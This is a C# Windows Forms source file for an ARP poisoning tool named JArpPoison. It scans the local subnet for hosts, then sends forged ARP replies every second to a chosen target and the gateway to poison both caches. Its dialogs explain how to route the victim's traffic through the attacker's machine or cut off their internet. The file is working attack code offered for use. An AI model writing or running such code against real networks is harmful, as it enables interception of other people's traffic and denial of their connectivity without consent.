using JARP;
using JARP.Classes;
using JARP.Helpers;
using JArpPoison.Classes;
using JArpPoison.Helpers;
using LukeSkywalker.IPNetwork;
using PacketDotNet;
using SharpPcap;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Windows.Forms;

namespace JArpPoison
{
    public partial class MainPage : Form
    {
        private JCaptureDevice _netCardInfo = new JCaptureDevice();
        private List<Target> _onlineClients = new List<Target>();
        private List<string> _ipsInSubnet = new List<string>();
        private JArper _jarper;
        private bool Stopped = false;

        public MainPage()
        {
            InitializeComponent();

            outputBox.PrintWelcomeMsg();

            _jarper = new JArper();

            _netCardInfo = _jarper.GatherNetworkDeviceInfo();
            if (_netCardInfo == null)
            {
                ExitProgram();
            }

            _netCardInfo.CaptureDevice.OnPacketArrival += new PacketArrivalEventHandler(device_OnPacketArrival);

            _netCardInfo.CaptureDevice.OpenDevice();

            outputBox.PrintNetworkInfo(_netCardInfo.CaptureDevice, new List<string>
            {
                _netCardInfo.OurIpAddress.ToString(),
                _netCardInfo.GatewayIpAddess.ToString(),
                _netCardInfo.SubnetMask.ToString(),
                _netCardInfo.OurMacAddress.ToString(),
            });

            TextBoxWriterExtensionss.PreFillTextBoxes(macTxtBox, ipTxtBox, _netCardInfo.OurMacAddress.ToString(), _netCardInfo.OurIpAddress.ToString());

            //Event driven from here...
        }

        private void device_OnPacketArrival(object sender, CaptureEventArgs packet)
        {
            Packet packetOuter = Packet.ParsePacket(packet.Packet.LinkLayerType, packet.Packet.Data);

            ARPPacket arpPacket = ARPPacket.GetEncapsulated(packetOuter);

            if (CaptureDeviceHelpers.CheckIfArpReplyIsForUs(arpPacket, _ipsInSubnet, _onlineClients))
            {
                _onlineClients.Add(new Target
                {
                    Ip = arpPacket.SenderProtocolAddress.ToString(),
                    Mac = arpPacket.SenderHardwareAddress.ToString()
                });
            }
        }

        private void scanBtn_Click(object sender, EventArgs e)
        {
            DialogResult res = MessageBox.Show(this, "Continuing will flood your subnet with ARP packets to look for any responses" +
                "\n\nThis wont do any harm, but might get you into trouble or at least look suspicious on networks YOU DO NOT OWN" +
                "\n\nAre you sure you want to do this?\n\n", "Warning", MessageBoxButtons.OKCancel, MessageBoxIcon.Information);

            if ("OK".Equals(res.ToString()))
            {
                scanBtn.Text = "Scanning...";

                string ipWithSubnet = _netCardInfo.OurIpAddress.ToString() + "/24";
                IPNetwork net = IPNetwork.Parse(ipWithSubnet);
                IPNetworkCollection ips = IPNetwork.Subnet(net, 32);  
                _ipsInSubnet = ips.GetIpRange();

                outputBox.printIpRangeInfo(ips, ipWithSubnet);

                if (_netCardInfo != null)
                {
                    new Thread(() =>
                    {
                        ScanResult scanResult = PerformScan(_netCardInfo);

                        _onlineClients = scanResult.OnlineClients;

                        outputBox.PrintArpScanDetails(scanResult.Duration, _onlineClients, _netCardInfo.GatewayIpAddess, _netCardInfo.OurIpAddress);

                        scanBtn.Invoke((MethodInvoker)delegate { scanBtn.Text = "Scan"; });

                    }).Start();
                }
            }
        }        

        private void sendJarpBtn_Click(object sender, EventArgs e)
        {
            if (!_jarper.ValidateTargets(this, ipTxtBox.Text, macTxtBox.Text, _netCardInfo))
            {
                return;
            }

            DialogResult res = MessageBox.Show(this, "Continuing will Poison both the ARP cache of the Gateway, and the Target you have selected\n\n" +
               "Ensure your registry keys (HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters Name=IpEnableRouter, Type=REG_DWORD) have a value of 1 to route traffic through you, or you will CUT OFF the targets Internet\n\nAre you sure you want to do this ?", "Warning", MessageBoxButtons.OKCancel, MessageBoxIcon.Stop);

            if ("OK".Equals(res.ToString()))
            {
                outputBox.Text += "\n\n----New JARP POISON Begininning----";
                stopJarpBtn.Visible = true;

                if (this.Stopped)
                {
                    this.Stopped = false;
                }

                if (_netCardInfo != null && !string.IsNullOrEmpty(ipTxtBox.Text))
                {
                    string[] ipArray = ipTxtBox.Text.Split('.');

                    IPAddress targetIp = IPHelpers.CreateIp(ipArray);

                    PhysicalAddress targetMac = PhysicalAddress.Parse(macTxtBox.Text.Replace(":", "").ToUpper());

                    List <EthernetPacket> responsePacketList = _jarper.CreateResponseArpPackets(_netCardInfo.CaptureDevice, _netCardInfo.OurMacAddress, targetMac, targetIp, _netCardInfo.GatewayIpAddess);

                    int count = 0;

                    new Thread(() =>
                    {
                        while (!this.Stopped)
                        {
                            _netCardInfo.CaptureDevice.SendPacket(responsePacketList[0]);
                            _netCardInfo.CaptureDevice.SendPacket(responsePacketList[1]);
                            count += 2;
                            outputBox.printArpingProgress(targetIp, _netCardInfo.GatewayIpAddess, _netCardInfo.OurMacAddress, count);

                            //Send a packet every second
                            Thread.Sleep(1000);
                        }
                    }).Start();                    
                }
            }
        }

        private void stopJarpBtn_Click(object sender, EventArgs e)
        {
            this.Stopped = true;
            stopJarpBtn.Visible = false;
        }

        private void MainPage_FormClosed(object sender, FormClosedEventArgs e)
        {
            Process.GetCurrentProcess().Kill();
        }

        private ScanResult PerformScan(JCaptureDevice dev)
        {
            ScanResult scanResult = new ScanResult();

            Stopwatch stopWatch = StartStopwatch();

            scanResult.OnlineClients = _jarper.ScanSubnet(dev.CaptureDevice, _ipsInSubnet, _onlineClients, dev.OurMacAddress, dev.OurIpAddress);

            stopWatch.Stop();

            scanResult.Duration = stopWatch.ElapsedMilliseconds;

            return scanResult;
        }

        private Stopwatch StartStopwatch()
        {
            Stopwatch stopWatch = new Stopwatch();
            stopWatch.Start();
            return stopWatch;
        }

        private void ExitProgram()
        {
            MessageBox.Show(this, "No valid device found.\nGoodbye...", "Goodbye", MessageBoxButtons.OK, MessageBoxIcon.Error);
            
            Process.GetCurrentProcess().Kill();
        }
    }

}
